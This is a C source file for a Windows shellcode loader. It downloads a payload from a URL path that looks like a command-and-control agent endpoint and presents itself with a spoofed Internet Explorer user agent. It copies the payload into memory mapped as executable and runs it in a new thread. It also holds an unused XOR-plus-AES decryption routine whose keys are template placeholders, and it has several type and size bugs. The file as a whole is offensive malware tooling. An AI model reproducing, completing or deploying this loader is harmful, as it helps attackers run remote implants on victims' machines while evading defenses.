#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <bcrypt.h>
#include <Wincrypt.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

BOOL Base64Decode(PCHAR base64, DWORD base64Size, PBYTE* pDecoded, DWORD* pDecodedSize) {
    if (CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, NULL, pDecodedSize, NULL, NULL)) {
        *pDecoded = (PBYTE)malloc(*pDecodedSize);
        if (*pDecoded == NULL) {
            return FALSE;
        }
        if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, *pDecoded, pDecodedSize, NULL, NULL)) {
            free(*pDecoded);
            return FALSE;
        }
        return TRUE;
    }
    return FALSE;
}

void XORWithKey(PBYTE data, DWORD dataSize, PBYTE key, DWORD keySize) {
    for (DWORD i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize];
    }
}

BOOL DecryptPayload(PBYTE encryptedPayload, DWORD encryptedSize, PBYTE* pDecryptedPayload, DWORD* pDecodedSize) {
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD cbData = 0;
    BOOL bResult = FALSE;
    DWORD decryptedSize = 0;

    char* xorKeyBase64 = "#1";
    DWORD xorKeyBase64Size = strlen(xorKeyBase64);
    PBYTE xorKey;
    DWORD xorKeySize;
    Base64Decode(xorKeyBase64, xorKeyBase64Size, &xorKey, &xorKeySize);

    XORWithKey(encryptedPayload, encryptedSize, xorKey, xorKeySize);

    char* aesKeyBase64 = "#2";
    DWORD aesKeyBase64Size = strlen(aesKeyBase64);
    PBYTE aesKey;
    DWORD aesKeySize;
    Base64Decode(aesKeyBase64, aesKeyBase64Size, &aesKey, &aesKeySize);

    char* ivBase64 = "#3";
    DWORD* ivBase64Size = strlen(ivBase64);
    PBYTE iv;
    DWORD ivSize;
    Base64Decode(ivBase64, ivBase64Size, &iv, &ivSize);

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
        goto cleanup;
    }

    // Set the chaining mode to CBC.
    if (!NT_SUCCESS(status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        goto cleanup;
    }

    // Generate the key object.
    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, NULL, 0, aesKey, aesKeySize, 0))) {
        goto cleanup;
    }

    // Get the output buffer size.
    if (!NT_SUCCESS(status = BCryptDecrypt(hKey, encryptedPayload, encryptedSize, NULL, iv, ivSize, NULL, 0, &decryptedSize, BCRYPT_BLOCK_PADDING))) {
        goto cleanup;
    }

    *pDecryptedPayload = (PBYTE)malloc(decryptedSize);
    DWORD *pDecryptedSize = decryptedSize;

    // Decrypt the payload.
    if (!NT_SUCCESS(status = BCryptDecrypt(hKey, encryptedPayload, encryptedSize, NULL, iv, ivSize, *pDecryptedPayload, decryptedSize, &cbData, BCRYPT_BLOCK_PADDING))) {
        goto cleanup;
    }

    bResult = TRUE;

cleanup:
    if (hAesAlg) BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hKey) BCryptDestroyKey(hKey);
    free(xorKey);
    free(aesKey);
    free(iv);
    return bResult;
}

BOOL FetchPayloadFromURL(PCSTR url, PBYTE* pPayload, DWORD* pPayloadSize) {
    HINTERNET hInternet, hConnect = NULL;
    DWORD bytesRead;
    BOOL bResult = FALSE;

    hInternet = InternetOpenA("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpenA failed (%d)\n", GetLastError());
        goto cleanup;
    }

    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrlA failed (%d)\n", GetLastError());
        goto cleanup;
    }

    *pPayload = (PBYTE)malloc(1024);
    if (!InternetReadFile(hConnect, *pPayload, 1024, &bytesRead)) {
        printf("InternetReadFile failed (%d)\n", GetLastError());
        goto cleanup;
    }

    *pPayloadSize = bytesRead;
    bResult = TRUE;

cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return bResult;
}

BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
    BOOL        bSTATE = TRUE;
    HANDLE        hFile = NULL;
    PVOID        pMapAddress = NULL;
    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    memcpy(pMapAddress, pPayload, sPayloadSize);
_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}

int main() {

    PVOID    pAddress = NULL;
    HANDLE    hThread = NULL;
    PBYTE    pPayload = NULL;
    DWORD    payloadSize = 0;

    if (!FetchPayloadFromURL("http://localhost:8081/agents/windows/cs", &pPayload, &payloadSize)) {
        return -1;
    }

    if (!LocalMapInject(pPayload, payloadSize, &pAddress)) {
        return -1;
    }
    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
    }

    free(pPayload);

    return 0;
}
